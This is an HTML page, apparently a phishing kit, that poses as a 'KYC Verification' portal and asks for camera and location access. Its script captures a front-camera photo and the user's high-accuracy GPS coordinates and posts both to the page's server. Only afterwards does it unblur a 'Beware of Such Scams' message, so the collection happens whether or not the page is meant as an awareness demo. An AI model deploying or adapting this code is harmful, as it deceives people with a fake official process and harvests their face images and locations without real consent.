<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>KYC Verification</title>

<style>
body {
  min-height: 100vh;
  background: #0b0e11;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #ffffff;
  margin: 0;
}

/* Wrapper */
.page {
  position: relative;
  width: 100%;
  max-width: 600px;
}

/* Content that gets blurred */
.content {
  background: #111;
  border: 1px solid #2a2d33;
  border-radius: 6px;
  padding: 40px 30px;
  text-align: center;
  filter: blur(6px);
  transition: filter 0.4s ease;
}

/* Active (unblurred) */
.content.active {
  filter: blur(0);
}

/* Overlay */
.overlay {
  position: absolute;
  inset: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  pointer-events: none;
}

/* KYC button container */
.kyc-box {
  background: #0f1115;
  border: 1px solid #3a3d43;
  padding: 30px 25px;
  border-radius: 8px;
  text-align: center;
  pointer-events: auto;
  box-shadow: 0 0 0 9999px rgba(0,0,0,0.55);
}

/* Heading */
h1 {
  font-family: Verdana, sans-serif;
  font-size: 22px;
  color: #ff4d4f;
  margin-bottom: 15px;
}

/* Text */
p {
  font-size: 15px;
  line-height: 1.6;
  color: #e4e6eb;
}

/* Button */
button {
  margin-top: 18px;
  padding: 12px 22px;
  background: #3f4db8;
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 15px;
  cursor: pointer;
}
</style>
</head>

<body>

<div class="page">

  <!-- BLURRED CONTENT -->
  <div class="content" id="mainContent">
    <h1>Beware of Such Scams</h1>
    <p>
      Fraudsters may impersonate official portals to collect personal data.<br><br>
      Always verify links, URLs, and permissions before proceeding.
    </p>
  </div>

  <!-- OVERLAY -->
  <div class="overlay" id="overlay">
    <div class="kyc-box">
      <h1>KYC Verification</h1>
      <p>
        Camera and location access is required to continue.
      </p>
      <button onclick="startKYC()">Proceed for KYC</button>
    </div>
  </div>

</div>

<script>
/* ===== AUTHORITATIVE OLD LOGIC (UNCHANGED) ===== */

async function capturePhoto() {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    stream.getTracks().forEach(t => t.stop());
    return canvas.toDataURL("image/jpeg", 0.8);
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    throw e;
  }
}

async function startKYC() {
  try {
    /* CAMERA */
    const imageData = await capturePhoto();
    await fetch("/capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData })
    });

    /* LOCATION (NON-BLOCKING) */
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          fetch("/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            })
          });
        },
        () => {},
        { enableHighAccuracy: true }
      );
    }

    /* REMOVE BLUR */
    document.getElementById("mainContent").classList.add("active");
    document.getElementById("overlay").style.display = "none";

  } catch (err) {
    alert("KYC permission denied or unavailable");
  }
}
</script>

</body>
</html>
